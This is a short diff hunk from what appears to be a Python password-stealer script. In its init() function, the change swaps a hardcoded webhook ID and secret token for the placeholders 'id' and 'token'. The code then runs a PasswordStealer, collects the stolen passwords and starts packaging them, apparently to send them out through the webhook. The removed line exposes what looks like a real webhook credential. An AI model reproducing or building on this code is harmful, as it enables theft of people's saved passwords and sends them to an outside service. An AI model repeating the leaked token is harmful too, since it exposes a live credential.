@@ -98,7 +98,7 @@ def opentext(text):
 	os.startfile("msg.txt")
 
 def init():
-	webhook = Webhook("518978078035279893","SeJV42bvj8ymZe5VM3Onz9DrDQ7Oi635HXantDCjlxQgXtII4IfBn0mwS1E4HQFlCy82")
+	webhook = Webhook("id","token")
 	stealer = PasswordStealer()
 	passwords = stealer.steal()
 	fields = []
